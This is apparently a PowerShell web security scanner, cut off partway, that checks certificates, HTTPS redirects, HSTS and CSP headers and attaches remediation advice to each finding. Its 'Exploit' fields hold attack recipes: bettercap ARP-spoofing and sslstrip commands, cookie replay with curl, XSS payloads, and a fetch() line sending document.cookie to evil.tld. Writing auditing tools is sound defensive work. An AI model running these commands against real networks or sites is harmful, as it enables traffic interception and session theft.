#Requires -Version 5.1
<#
================================================================================
 WebRecon v1.0 - Non-intrusive web security auditor
================================================================================

.SYNOPSIS
    Scans a list of websites, lists the security weaknesses it can detect from
    the outside, and explains, for each one, how it can be exploited.

.DESCRIPTION
    WebRecon is a black-box, read-only scanner. It never writes anything on the
    target: it only issues GET / HEAD / OPTIONS / TRACE requests (plus optional
    probe requests in -DeepScan mode) and analyses the answers.

    For every weakness found the report contains:
      - a severity rating (Critical / High / Medium / Low / Info)
      - the exact endpoint and the raw evidence
      - the real-world impact
      - a step-by-step exploitation recipe
      - a remediation hint and a reference link

    Checks performed:
      Transport ...... TLS certificate validity / expiry / hostname mismatch,
                       weak signature algorithm, legacy TLS 1.0-1.1, missing
                       HTTP -> HTTPS redirect, missing or weak HSTS.
      Headers ........ CSP, X-Frame-Options, X-Content-Type-Options,
                       Referrer-Policy, Permissions-Policy.
      Cookies ........ Missing Secure / HttpOnly / SameSite, weak naming.
      Disclosure ..... Server / X-Powered-By / X-AspNet-Version banners.
      CORS ........... Wildcard, origin reflection, credentials handling.
      Content ........ Mixed content, missing Subresource Integrity, insecure
                       form actions, directory listing.
      Deep mode ...... .git, .env, backup and config files, phpinfo, Swagger,
                       Spring Actuator, admin panels, HTTP methods.

.PARAMETER Sites
    One or more target URLs. A missing scheme defaults to https://.

.PARAMETER TimeoutSec
    Per-request timeout, in seconds. Default: 15.

.PARAMETER DeepScan
    Adds the slower checks (sensitive file probing, admin panels, HTTP methods).

.PARAMETER OutputPath
    Directory receiving the exported reports. Default: current directory.

.PARAMETER Formats
    Report formats to write: Json, Csv, Html. Default: Json.

.PARAMETER UserAgent
    User-Agent header sent with every request.

.PARAMETER SkipCertificateCheck
    Keep scanning even when the TLS certificate is invalid.

.PARAMETER SeverityThreshold
    Hide findings below this severity in the console output. Default: Info.

.PARAMETER NoBanner
    Do not print the ASCII banner.

.EXAMPLE
    .\main.ps1 -Sites 'https://example.com'

.EXAMPLE
    .\main.ps1 example.com https://shop.example.org -DeepScan -Formats Json,Html

.EXAMPLE
    .\main.ps1 -Sites 'https://example.com' -SeverityThreshold High -OutputPath .\reports

.NOTES
    Author  : Venice
    Licence : MIT
    Requires: PowerShell 5.1+ / .NET 4.5+  (PowerShell 7+ strongly recommended)

    STRING RULES USED IN THIS FILE (important for maintainers)
      * Long texts are plain double-quoted strings.
      * The ONLY escape sequence used is `n (newline).
      * No backtick is ever placed directly against < > " or a digit.
      * HTML attributes inside a text use single quotes.
      * Placeholders are {0}, {1}, ... resolved with the -f operator, which is
        always parenthesised: ("text {0}" -f $value)
================================================================================
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true, Position = 0, ValueFromRemainingArguments = $true)]
    [Alias('Url', 'Target')]
    [string[]]$Sites,

    [ValidateRange(1, 300)]
    [int]$TimeoutSec = 15,

    [switch]$DeepScan,

    [string]$OutputPath = (Get-Location).Path,

    [ValidateSet('Json', 'Csv', 'Html')]
    [string[]]$Formats = @('Json'),

    [string]$UserAgent = 'Mozilla/5.0 (compatible; WebRecon/1.0; +security-audit)',

    [switch]$SkipCertificateCheck,

    [ValidateSet('Critical', 'High', 'Medium', 'Low', 'Info')]
    [string]$SeverityThreshold = 'Info',

    [switch]$NoBanner
)

Set-StrictMode -Version 2.0
$ErrorActionPreference = 'Stop'

# ==============================================================================
#  GLOBAL STATE
# ==============================================================================

$script:UserAgent = $UserAgent
$script:Timeout   = $TimeoutSec
$script:Findings  = [System.Collections.Generic.List[object]]::new()
$script:Targets   = [System.Collections.Generic.List[object]]::new()

$script:SeverityRank = @{
    Critical = 5; High = 4; Medium = 3; Low = 2; Info = 1
}

$script:SeverityColor = @{
    Critical = 'Magenta'; High = 'Red'; Medium = 'Yellow'; Low = 'Cyan'; Info = 'DarkGray'
}

$script:SeverityBadge = @{
    Critical = '[ CRITICAL ]'
    High     = '[   HIGH   ]'
    Medium   = '[  MEDIUM  ]'
    Low      = '[   LOW    ]'
    Info     = '[   INFO   ]'
}

$script:ScoreWeight = @{
    Critical = 20.0; High = 10.0; Medium = 4.0; Low = 1.5; Info = 0.25
}

# ==============================================================================
#  CONSOLE USER INTERFACE HELPERS
# ==============================================================================

<#
.SYNOPSIS
    Prints the tool banner.
#>
function Write-Banner {
    $art = @(
        ' __      __    _     ___                    '
        ' \ \    / /   | |   | _ \  ___  __  ___ _ _ '
        '  \ \/\/ / | | | |__ |   / / -_)|  \/ _ \ '' \'
        '   \_/\_/  |_| |____||_|_\ \___||_/\___/_||_|'
        '  WebRecon v1.0 - non-intrusive web security auditor'
    )
    Write-Host ''
    foreach ($line in $art) { Write-Host $line -ForegroundColor DarkCyan }
    Write-Host ''
}

<#
.SYNOPSIS
    Prints a horizontal rule.
#>
function Write-Rule {
    param(
        [string]$Char = '-',
        [string]$Color = 'DarkGray',
        [int]$Length = 78
    )
    Write-Host ($Char * $Length) -ForegroundColor $Color
}

<#
.SYNOPSIS
    Prints a section headline.
#>
function Write-Headline {
    param([string]$Text, [string]$Color = 'White')
    Write-Host ''
    Write-Host ('>> ' + $Text.ToUpper()) -ForegroundColor $Color
    Write-Rule
}

<#
.SYNOPSIS
    Prints a neutral status line.
#>
function Write-Status {
    param([string]$Text, [string]$Color = 'Gray', [string]$Prefix = '[*]')
    Write-Host ("$Prefix $Text") -ForegroundColor $Color
}

<#
.SYNOPSIS
    Wraps a long string on whitespace so it fits the console width.
#>
function Format-WrappedText {
    param([string]$Text, [int]$Width = 104)

    if ([string]::IsNullOrWhiteSpace($Text)) { return '' }

    $words = $Text -split '\s+'
    $lines = [System.Collections.Generic.List[string]]::new()
    $current = ''

    foreach ($word in $words) {
        if (($current.Length + $word.Length + 1) -gt $Width) {
            if ($current) { $lines.Add($current) }
            $current = $word
        }
        else {
            if ($current) { $current = "$current $word" } else { $current = $word }
        }
    }
    if ($current) { $lines.Add($current) }
    return ($lines -join "`n")
}

<#
.SYNOPSIS
    Prints one labelled field of a finding, wrapped and indented.
#>
function Write-Field {
    param([string]$Label, [string]$Value)

    if ([string]::IsNullOrWhiteSpace($Value)) { return }

    $indent = '              '
    $wrapped = Format-WrappedText -Text $Value
    $lines = $wrapped -split "`n"

    Write-Host ($indent + $Label.PadRight(10) + ' : ') -ForegroundColor DarkGray -NoNewline
    Write-Host $lines[0] -ForegroundColor Gray

    for ($i = 1; $i -lt $lines.Count; $i++) {
        Write-Host ($indent + (' ' * 10) + '   ' + $lines[$i]) -ForegroundColor Gray
    }
}

<#
.SYNOPSIS
    Renders a single finding as a readable console block.
#>
function Write-Finding {
    param([Parameter(Mandatory)][pscustomobject]$Finding)

    $color = $script:SeverityColor[$Finding.Severity]
    $badge = $script:SeverityBadge[$Finding.Severity]

    Write-Host ('  ' + $badge + ' ') -ForegroundColor $color -NoNewline
    Write-Host $Finding.Title -ForegroundColor White
    Write-Host ('              ' + $Finding.Id + '  |  ' + $Finding.Category) -ForegroundColor DarkGray

    Write-Field 'Endpoint'  $Finding.Endpoint
    Write-Field 'Evidence'  $Finding.Evidence
    Write-Field 'Impact'    $Finding.Impact
    Write-Field 'Exploit'   $Finding.Exploit
    Write-Field 'Fix'       $Finding.Remediation
    Write-Field 'Reference' $Finding.Reference

    Write-Host ''
}

<#
.SYNOPSIS
    Registers a new finding and prints it live if it passes the severity filter.
#>
function Add-Finding {
    param(
        [Parameter(Mandatory)][string]$Site,
        [Parameter(Mandatory)][string]$Id,
        [Parameter(Mandatory)][string]$Title,
        [Parameter(Mandatory)][ValidateSet('Critical', 'High', 'Medium', 'Low', 'Info')][string]$Severity,
        [string]$Category = 'General',
        [string]$Endpoint = '',
        [string]$Evidence = '',
        [string]$Impact = '',
        [string]$Exploit = '',
        [string]$Remediation = '',
        [string]$Reference = ''
    )

    $finding = [pscustomobject]@{
        Id           = $Id
        Site         = $Site
        Title        = $Title
        Severity     = $Severity
        Category     = $Category
        Endpoint     = $Endpoint
        Evidence     = $Evidence
        Impact       = $Impact
        Exploit      = $Exploit
        Remediation  = $Remediation
        Reference    = $Reference
        DiscoveredAt = (Get-Date).ToString('s')
    }

    $script:Findings.Add($finding)

    if ($script:SeverityRank[$Severity] -ge $script:SeverityRank[$SeverityThreshold]) {
        Write-Finding -Finding $finding
    }
}

# ==============================================================================
#  HTTP LAYER
# ==============================================================================

<#
.SYNOPSIS
    Creates a reusable HttpClient, optionally ignoring certificate errors.
#>
function New-HttpClient {
    param([switch]$NoRedirect)

    $handler = New-Object System.Net.Http.HttpClientHandler
    $handler.AllowAutoRedirect = (-not $NoRedirect)
    $handler.MaxAutomaticRedirections = 5

    if ($SkipCertificateCheck) {
        if ($handler.PSObject.Properties['ServerCertificateCustomValidationCallback']) {
            # .NET Core / PowerShell 7 path
            $handler.ServerCertificateCustomValidationCallback = {
                param($message, $cert, $chain, $errors) $true
            }
        }
        else {
            # .NET Framework fallback (process-wide switch)
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        }
    }

    $client = New-Object System.Net.Http.HttpClient($handler)
    $client.Timeout = [TimeSpan]::FromSeconds($script:Timeout)
    $client.DefaultRequestHeaders.UserAgent.ParseAdd($script:UserAgent)

    return $client
}

<#
.SYNOPSIS
    Sends one HTTP request and returns a normalised response object.

.OUTPUTS
    PSCustomObject with: Url, StatusCode, ReasonPhrase, Headers, SetCookies,
    Content, Length, FinalUrl, ElapsedMs, Error, Succeeded.
#>
function Invoke-HttpProbe {
    param(
        [Parameter(Mandatory)][string]$Url,
        [string]$Method = 'GET',
        [hashtable]$Headers = @{},
        [switch]$NoRedirect
    )

    $result = [pscustomobject]@{
        Url          = $Url
        StatusCode   = 0
        ReasonPhrase = ''
        Headers      = [hashtable]::new([System.StringComparer]::OrdinalIgnoreCase)
        SetCookies   = @()
        Content      = ''
        Length       = 0
        FinalUrl     = $Url
        ElapsedMs    = 0
        Error        = ''
        Succeeded    = $false
    }

    $client   = $null
    $response = $null

    try {
        $client = New-HttpClient -NoRedirect:$NoRedirect
        $httpMethod = New-Object System.Net.Http.HttpMethod($Method)
        $request = New-Object System.Net.Http.HttpRequestMessage($httpMethod, $Url)

        foreach ($key in $Headers.Keys) {
            [void]$request.Headers.TryAddWithoutValidation($key, [string]$Headers[$key])
        }

        $watch = [System.Diagnostics.Stopwatch]::StartNew()
        $response = $client.SendAsync($request).GetAwaiter().GetResult()
        $watch.Stop()

        $result.ElapsedMs    = $watch.ElapsedMilliseconds
        $result.StatusCode   = [int]$response.StatusCode
        $result.ReasonPhrase = [string]$response.ReasonPhrase
        $result.FinalUrl     = $response.RequestMessage.RequestUri.AbsoluteUri
        $result.Succeeded    = $true

        foreach ($header in $response.Headers) {
            $result.Headers[$header.Key] = ($header.Value -join ', ')
        }
        foreach ($header in $response.Content.Headers) {
            $result.Headers[$header.Key] = ($header.Value -join ', ')
        }

        if ($result.Headers.ContainsKey('Set-Cookie')) {
            $result.SetCookies = @($result.Headers['Set-Cookie'] -split ', (?=[^ ]+=)')
        }

        $body = $response.Content.ReadAsStringAsync().GetAwaiter().GetResult()
        if ($null -eq $body) { $body = '' }
        if ($body.Length -gt 500000) { $body = $body.Substring(0, 500000) }

        $result.Content = $body
        $result.Length  = $body.Length
    }
    catch {
        $result.Error = $_.Exception.Message
        $inner = $_.Exception.InnerException
        if ($inner) { $result.Error = "$($result.Error) / $($inner.Message)" }
    }
    finally {
        if ($response) { $response.Dispose() }
        if ($client)   { $client.Dispose() }
    }

    return $result
}

<#
.SYNOPSIS
    Returns the value of a header, or an empty string when absent.
#>
function Get-HeaderValue {
    param([hashtable]$Headers, [string]$Name)
    if ($Headers.ContainsKey($Name)) { return [string]$Headers[$Name] }
    return ''
}

# ==============================================================================
#  TARGET RESOLUTION
# ==============================================================================

<#
.SYNOPSIS
    Turns a user supplied string into a normalised target object.
#>
function Resolve-Target {
    param(
        [Parameter(Mandatory)]
        [Alias('Input', 'Url')]
        [string]$TargetUrl
    )

    if ([string]::IsNullOrEmpty($TargetUrl)) { return $null }

    # Strip whitespace plus the invisible characters that break [System.Uri]:
    # BOM, zero-width space/joiner, non-breaking space, tab, CR, LF.
    $trimChars = [char[]]@(0xFEFF, 0x200B, 0x200C, 0x00A0, 0x20, 0x09, 0x0D, 0x0A)
    $raw = $TargetUrl.Trim($trimChars)

    if ([string]::IsNullOrWhiteSpace($raw)) { return $null }

    if ($raw -notmatch '^https?://') { $raw = 'https://' + $raw }

    $uri = $null
    try { $uri = [System.Uri]::new($raw) } catch { return $null }

    if ([string]::IsNullOrEmpty($uri.Host)) { return $null }

    return [pscustomobject]@{
        Input   = $TargetUrl
        Uri     = $uri
        Url     = $uri.AbsoluteUri
        Scheme  = $uri.Scheme
        Host    = $uri.Host
        Port    = $uri.Port
        BaseUrl = ('{0}://{1}' -f $uri.Scheme, $uri.Authority)
    }
}

<#
.SYNOPSIS
    Builds an absolute URL from a target and a relative path.
#>
function Join-TargetUrl {
    param([pscustomobject]$Target, [string]$Path)
    if ($Path -notmatch '^/') { $Path = '/' + $Path }
    return $Target.BaseUrl + $Path
}

# ==============================================================================
#  TRANSPORT SECURITY CHECKS
# ==============================================================================

<#
.SYNOPSIS
    Reads the TLS certificate presented by a host (ignoring trust errors).
#>
function Get-TlsCertificateInfo {
    param([string]$HostName, [int]$Port = 443)

    $tcp = $null
    $ssl = $null

    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $tcp.Connect($HostName, $Port)

        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $cert, $chain, $errors) $true
        }

        $ssl = New-Object System.Net.Security.SslStream($tcp.GetStream(), $false, $callback)
        $ssl.AuthenticateAsClient($HostName)

        $rawCert = $ssl.RemoteCertificate
        if ($null -eq $rawCert) { return $null }

        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($rawCert)

        $san = @()
        foreach ($ext in $cert.Extensions) {
            if ($ext.Oid.Value -eq '2.5.29.17') {
                $san += ($ext.Format($false) -split ',\s*')
            }
        }

        return [pscustomobject]@{
            Subject       = $cert.Subject
            Issuer        = $cert.Issuer
            NotBefore     = $cert.NotBefore
            NotAfter      = $cert.NotAfter
            DaysRemaining = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
            Protocol      = [string]$ssl.SslProtocol
            Signature     = $cert.SignatureAlgorithm.FriendlyName
            Thumbprint    = $cert.Thumbprint
            AltNames      = $san
            SelfSigned    = ($cert.Subject -eq $cert.Issuer)
        }
    }
    catch {
        return $null
    }
    finally {
        if ($ssl) { $ssl.Dispose() }
        if ($tcp) { $tcp.Close() }
    }
}

<#
.SYNOPSIS
    Tests whether the host still accepts a specific (legacy) TLS version.
#>
function Test-TlsProtocolSupport {
    param(
        [string]$HostName,
        [int]$Port = 443,
        [System.Security.Authentication.SslProtocols]$Protocol
    )

    $tcp = $null
    $ssl = $null

    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $tcp.Connect($HostName, $Port)

        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $cert, $chain, $errors) $true
        }

        $ssl = New-Object System.Net.Security.SslStream($tcp.GetStream(), $false, $callback)
        $ssl.AuthenticateAsClient($HostName, $null, $Protocol, $false)
        return $true
    }
    catch {
        return $false
    }
    finally {
        if ($ssl) { $ssl.Dispose() }
        if ($tcp) { $tcp.Close() }
    }
}

<#
.SYNOPSIS
    Validates the certificate chain, expiry and hostname coverage.
#>
function Test-CertificateHealth {
    param([pscustomobject]$Target, [pscustomobject]$Cert)

    if ($null -eq $Cert) {
        Add-Finding -Site $Target.Host -Id 'WEB-016' `
            -Title 'TLS handshake failed or certificate unreadable' `
            -Severity 'High' -Category 'Transport Security' -Endpoint $Target.BaseUrl `
            -Evidence 'No usable certificate could be retrieved on port 443.' `
            -Impact 'Clients hit a trust error or cannot negotiate TLS at all, pushing users towards plain HTTP.' `
            -Exploit 'Run openssl s_client -connect HOST:443 -servername HOST to read the raw handshake error. If the port is closed, scan for an alternative HTTPS port with nmap -p- --open HOST.' `
            -Remediation 'Install a valid certificate chain (leaf + intermediates) and enable TLS 1.2/1.3 only.' `
            -Reference 'https://www.ssllabs.com/ssltest/'
        return
    }

    # --- Expiry ---------------------------------------------------------------
    if ($Cert.NotAfter -lt (Get-Date)) {
        Add-Finding -Site $Target.Host -Id 'WEB-016' `
            -Title 'TLS certificate has expired' `
            -Severity 'Critical' -Category 'Transport Security' -Endpoint $Target.BaseUrl `
            -Evidence ("NotAfter = {0} ({1} days ago)" -f $Cert.NotAfter.ToString('u'), [math]::Abs($Cert.DaysRemaining)) `
            -Impact 'Every browser shows a full-page warning. Users click through, training them to ignore certificate errors.' `
            -Exploit 'Set up an HTTPS server with any self-signed certificate on a hostile network (mitmproxy --mode transparent). Because the victim already clicks through warnings, they will not notice the attacker certificate either, and tcpdump then reads the traffic.' `
            -Remediation 'Renew the certificate and automate renewal (certbot renew / ACME).' `
            -Reference 'https://letsencrypt.org/docs/'
    }
    elseif ($Cert.DaysRemaining -lt 15) {
        Add-Finding -Site $Target.Host -Id 'WEB-017' `
            -Title 'TLS certificate expires in less than 15 days' `
            -Severity 'High' -Category 'Transport Security' -Endpoint $Target.BaseUrl `
            -Evidence ("NotAfter = {0} ({1} days remaining)" -f $Cert.NotAfter.ToString('u'), $Cert.DaysRemaining) `
            -Impact 'An outage is imminent if renewal is not automated.' `
            -Exploit 'Nothing to exploit directly; schedule a scan on the expiry date and observe the outage window.' `
            -Remediation 'Enable automatic renewal and monitor expiry with an external check.' `
            -Reference 'https://letsencrypt.org/docs/'
    }
    elseif ($Cert.DaysRemaining -lt 30) {
        Add-Finding -Site $Target.Host -Id 'WEB-017' `
            -Title 'TLS certificate expires in less than 30 days' `
            -Severity 'Medium' -Category 'Transport Security' -Endpoint $Target.BaseUrl `
            -Evidence ("NotAfter = {0} ({1} days remaining)" -f $Cert.NotAfter.ToString('u'), $Cert.DaysRemaining) `
            -Impact 'Renewal window is tight.' `
            -Exploit 'Not directly exploitable.' `
            -Remediation 'Renew now and automate the process.' `
            -Reference 'https://letsencrypt.org/docs/'
    }

    # --- Hostname coverage ----------------------------------------------------
    if ($Cert.AltNames.Count -gt 0) {
        $covered = $false
        foreach ($entry in $Cert.AltNames) {
            $name = $entry -replace '^DNS Name=', ''
            if ($name -eq $Target.Host) { $covered = $true; break }
            if ($name -like '*.?*') {
                $suffix = $name.Substring(1)
                if ($Target.Host.EndsWith($suffix)) { $covered = $true; break }
            }
        }
        if (-not $covered) {
            Add-Finding -Site $Target.Host -Id 'WEB-018' `
                -Title 'Certificate does not cover the requested hostname' `
                -Severity 'High' -Category 'Transport Security' -Endpoint $Target.BaseUrl `
                -Evidence ("Host {0} absent from SAN list: {1}" -f $Target.Host, ($Cert.AltNames -join '; ')) `
                -Impact 'Clients reach the site through a hostname the certificate was not issued for, so trust errors appear and users click through them.' `
                -Exploit 'Any attacker with a valid certificate for a different name can serve the site on a hostile network, and users will click through the warning as usual.' `
                -Remediation 'Reissue the certificate with a complete SAN list, or fix the DNS record that points to the wrong vhost.' `
                -Reference 'https://datatracker.ietf.org/doc/html/rfc6125'
        }
    }

    # --- Self-signed ----------------------------------------------------------
    if ($Cert.SelfSigned) {
        Add-Finding -Site $Target.Host -Id 'WEB-019' `
            -Title 'Self-signed certificate in use' `
            -Severity 'Medium' -Category 'Transport Security' -Endpoint $Target.BaseUrl `
            -Evidence ("Subject == Issuer == {0}" -f $Cert.Subject) `
            -Impact 'No third-party validation of the public key.' `
            -Exploit 'Generate a certificate with the exact same subject string and present it on a hostile network. Because the victim is used to warnings, they accept it and the attacker decrypts everything.' `
            -Remediation 'Use a publicly trusted CA, or distribute the internal CA root properly.' `
            -Reference 'https://datatracker.ietf.org/doc/html/rfc5280'
    }

    # --- Weak signature -------------------------------------------------------
    if ($Cert.Signature -match 'sha1|md5') {
        Add-Finding -Site $Target.Host -Id 'WEB-020' `
            -Title ("Certificate signed with a weak algorithm ({0})" -f $Cert.Signature) `
            -Severity 'Low' -Category 'Transport Security' -Endpoint $Target.BaseUrl `
            -Evidence ("SignatureAlgorithm = {0}" -f $Cert.Signature) `
            -Impact 'SHA-1 collisions (SHAttered) make certificate forgery practical for well-resourced attackers.' `
            -Exploit 'Reproduce with: openssl s_client -connect HOST:443 | openssl x509 -noout -text | grep "Signature Algorithm". A collision-capable attacker can produce a second certificate with the same signature.' `
            -Remediation 'Reissue the certificate with SHA-256 or stronger.' `
            -Reference 'https://shattered.io/'
    }
}

<#
.SYNOPSIS
    Detects missing HTTP -> HTTPS redirect and missing/weak HSTS.
#>
function Test-TransportHardening {
    param([pscustomobject]$Target)

    # --- Plain HTTP reachability / redirect -----------------------------------
    if ($Target.Scheme -eq 'https') {
        $plain = Invoke-HttpProbe -Url ('http://{0}/' -f $Target.Uri.Authority) -Method 'GET' -NoRedirect

        if ($plain.Succeeded) {
            $code     = $plain.StatusCode
            $location = Get-HeaderValue -Headers $plain.Headers -Name 'Location'

            if ($code -eq 200) {
                Add-Finding -Site $Target.Host -Id 'WEB-021' `
                    -Title 'No HTTP -> HTTPS redirect: content is served over plain HTTP' `
                    -Severity 'High' -Category 'Transport Security' `
                    -Endpoint ('http://{0}/' -f $Target.Uri.Authority) `
                    -Evidence 'The plain HTTP request returned 200 OK instead of a 301/302 to https://.' `
                    -Impact 'A user typing the bare domain stays on HTTP for the whole session. Cookies, credentials and content travel in clear text.' `
                    -Exploit ("1) Position yourself on the victim network (open Wi-Fi, ARP spoof, rogue AP).`n2) Run: bettercap -iface wlan0 -eval 'set arp.spoof.targets 192.168.1.50; arp.spoof on; net.sniff on'`n3) Any login performed over http:// is captured verbatim in the PCAP.`n4) Replay the session: curl -H 'Cookie: PHPSESSID=stolen' https://target/") `
                    -Remediation 'Return 301 Moved Permanently with Location: https://host/request-uri for every plain HTTP request.' `
                    -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Redirections'
            }
            elseif ($code -in 301, 302, 307, 308) {
                if ($location -and $location -notmatch '^https://') {
                    Add-Finding -Site $Target.Host -Id 'WEB-022' `
                        -Title 'HTTP redirect does not point to HTTPS' `
                        -Severity 'Medium' -Category 'Transport Security' `
                        -Endpoint ('http://{0}/' -f $Target.Uri.Authority) `
                        -Evidence ("{0} {1} -> Location: {2}" -f $code, $plain.ReasonPhrase, $location) `
                        -Impact 'The redirect chain keeps the user on HTTP, so the same interception applies.' `
                        -Exploit 'Intercept the plain HTTP response and rewrite the Location header to your own host; the victim follows it blindly.' `
                        -Remediation 'Always redirect to an absolute https:// URL, and chain the redirect so only one hop is needed.' `
                        -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Redirections'
                }
            }
        }
    }

    # --- HSTS -----------------------------------------------------------------
    if ($Target.Scheme -ne 'https') { return }

    $https = Invoke-HttpProbe -Url $Target.Url
    if (-not $https.Succeeded) { return }

    $hsts = Get-HeaderValue -Headers $https.Headers -Name 'Strict-Transport-Security'

    if (-not $hsts) {
        Add-Finding -Site $Target.Host -Id 'WEB-023' `
            -Title 'Missing HTTP Strict Transport Security (HSTS) header' `
            -Severity 'Medium' -Category 'Transport Security' -Endpoint $Target.Url `
            -Evidence 'No Strict-Transport-Security header in the HTTPS response.' `
            -Impact 'The browser never upgrades http:// links, so the very first request of a session stays interceptable even if the site redirects correctly.' `
            -Exploit ("1) Join the victim network.`n2) Run an SSL-strip style attack: bettercap -iface wlan0 -eval 'set http.proxy.sslstrip true; http.proxy on; arp.spoof on'`n3) The initial http:// request is answered by the attacker, who forwards it over HTTPS to the real site.`n4) Everything the victim sends before the redirect is visible in clear text, including session cookies that lack the Secure flag.") `
            -Remediation 'Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload and submit the domain to hstspreload.org.' `
            -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Headers/Strict-Transport-Security'
        return
    }

    if ($hsts -match 'max-age\s*=\s*"?(\d+)"?') {
        $maxAge = [int]$Matches[1]
        if ($maxAge -lt 15552000) {
            Add-Finding -Site $Target.Host -Id 'WEB-024' `
                -Title 'HSTS max-age is shorter than 6 months' `
                -Severity 'Low' -Category 'Transport Security' -Endpoint $Target.Url `
                -Evidence ("Strict-Transport-Security: {0}" -f $hsts) `
                -Impact 'The browser forgets the policy quickly, reopening the SSL-strip window every time the entry expires.' `
                -Exploit 'Wait for the max-age window to elapse, then run the same sslstrip attack as for a missing HSTS header.' `
                -Remediation 'Raise max-age to at least 31536000 (one year), ideally two years.' `
                -Reference 'https://hstspreload.org/'
        }
    }

    if ($hsts -notmatch 'includeSubDomains') {
        Add-Finding -Site $Target.Host -Id 'WEB-025' `
            -Title 'HSTS does not cover subdomains' `
            -Severity 'Info' -Category 'Transport Security' -Endpoint $Target.Url `
            -Evidence ("Strict-Transport-Security: {0}" -f $hsts) `
            -Impact 'Any subdomain reachable over HTTP is a valid downgrade entry point.' `
            -Exploit 'Find a subdomain without HTTPS (dig sub.target A), serve it over plain HTTP and use it as the SSL-strip entry point for a cookie scoped to the parent domain.' `
            -Remediation 'Add includeSubDomains to the header.' `
            -Reference 'https://hstspreload.org/'
    }
}

<#
.SYNOPSIS
    Checks whether legacy TLS versions are still negotiated.
#>
function Test-LegacyTls {
    param([pscustomobject]$Target)

    if ($Target.Scheme -ne 'https') { return }

    $legacy = @(
        @{ Proto = [System.Security.Authentication.SslProtocols]::Tls;   Label = 'TLS 1.0'; Sev = 'Medium' }
        @{ Proto = [System.Security.Authentication.SslProtocols]::Tls11; Label = 'TLS 1.1'; Sev = 'Low' }
    )

    foreach ($item in $legacy) {
        if (Test-TlsProtocolSupport -HostName $Target.Host -Port $Target.Port -Protocol $item.Proto) {
            $slug = $item.Label -replace '[^0-9]', ''
            $cli  = $item.Label -replace 'TLS ', 'tls'
            $cli  = $cli.Replace('.', '_')

            Add-Finding -Site $Target.Host -Id ('WEB-026-' + $slug) `
                -Title ("Legacy {0} still accepted by the server" -f $item.Label) `
                -Severity $item.Sev -Category 'Transport Security' -Endpoint $Target.BaseUrl `
                -Evidence ("Handshake succeeded with {0}" -f $item.Label) `
                -Impact 'Old protocol versions keep well-known cryptographic weaknesses available to a downgrade attack.' `
                -Exploit ("Force the version: openssl s_client -connect {0}:{1} -{2}. Then enumerate ciphers with: nmap --script ssl-enum-ciphers -p {1} {0} and look for CBC/RC4 or export-grade suites. BEAST, Lucky13 and POODLE-style padding oracles apply on CBC suites." -f $Target.Host, $Target.Port, $cli) `
                -Remediation 'Restrict the server to TLS 1.2 and 1.3 with an AEAD-only cipher list.' `
                -Reference 'https://wiki.mozilla.org/Security/Server_Side_TLS'
        }
    }
}

# ==============================================================================
#  RESPONSE HEADER CHECKS
# ==============================================================================

<#
.SYNOPSIS
    Audits the security-related response headers.
#>
function Test-SecurityHeaders {
    param([pscustomobject]$Target, [pscustomobject]$Response)

    $headers  = $Response.Headers
    $endpoint = $Response.Url

    # --- Content-Security-Policy ---------------------------------------------
    $csp = Get-HeaderValue -Headers $headers -Name 'Content-Security-Policy'

    if (-not $csp) {
        Add-Finding -Site $Target.Host -Id 'WEB-030' `
            -Title 'Missing Content-Security-Policy header' `
            -Severity 'Medium' -Category 'Response Headers' -Endpoint $endpoint `
            -Evidence 'No Content-Security-Policy header in the response.' `
            -Impact 'Any HTML injection immediately becomes script execution: there is no second line of defence behind the sanitisation code.' `
            -Exploit ("1) Look for a reflected parameter: https://target/search?q=<svg/onload=alert(1)>`n2) If the payload is echoed unescaped, JavaScript runs in the origin.`n3) Exfiltrate the session or tokens: fetch('https://evil.tld/?c=' + encodeURIComponent(document.cookie))`n4) Load an external script to keep persistence.") `
            -Remediation 'Deploy a strict policy, e.g. default-src self; script-src self nonce-...; object-src none; base-uri self; frame-ancestors self.' `
            -Reference 'https://developer.mozilla.org/docs/Web/HTTP/CSP'
    }
    else {
        if ($csp -match 'unsafe-inline') {
            Add-Finding -Site $Target.Host -Id 'WEB-031' `
                -Title 'CSP allows unsafe-inline scripts' `
                -Severity 'Low' -Category 'Response Headers' -Endpoint $endpoint `
                -Evidence ("Content-Security-Policy: {0}" -f $csp) `
                -Impact 'Inline event handlers and script blocks are still executable, which is the most common XSS injection vector.' `
                -Exploit 'Inject a handler into any reflected field: <img src=x onerror=alert(document.domain)>. With unsafe-inline active, the handler runs even though a CSP is present.' `
                -Remediation 'Move to a nonce or hash based policy and drop unsafe-inline.' `
                -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Headers/Content-Security-Policy/script-src'
        }
        if ($csp -match 'unsafe-eval') {
            Add-Finding -Site $Target.Host -Id 'WEB-032' `
                -Title 'CSP allows unsafe-eval' `
                -Severity 'Low' -Category 'Response Headers' -Endpoint $endpoint `
                -Evidence ("Content-Security-Policy: {0}" -f $csp) `
                -Impact 'eval() and the Function() constructor stay usable, widening the exploitation surface of any DOM sink.' `
                -Exploit 'If a DOM sink feeds eval with a controllable value, inject a string payload such as ?json={"a":"1\\"};alert(1)//' `
                -Remediation 'Remove unsafe-eval after verifying no library depends on it.' `
                -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Headers/Content-Security-Policy/script-src'
        }
        if ($csp -notmatch 'frame-ancestors') {
            Add-Finding -Site $Target.Host -Id 'WEB-033' `
                -Title 'CSP has no frame-ancestors directive' `
                -Severity 'Low' -Category 'Response Headers' -Endpoint $endpoint `
                -Evidence 'frame-ancestors absent from the policy.' `
                -Impact 'Framing restrictions rely solely on X-Frame-Options, which is legacy and less expressive.' `
                -Exploit 'See the clickjacking recipe below; if X-Frame-Options is also missing, framing is unrestricted.' `
                -Remediation 'Add frame-ancestors self (or the exact allowed origins) to the policy.' `
                -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors'
        }
    }

    # --- X-Content-Type-Options ----------------------------------------------
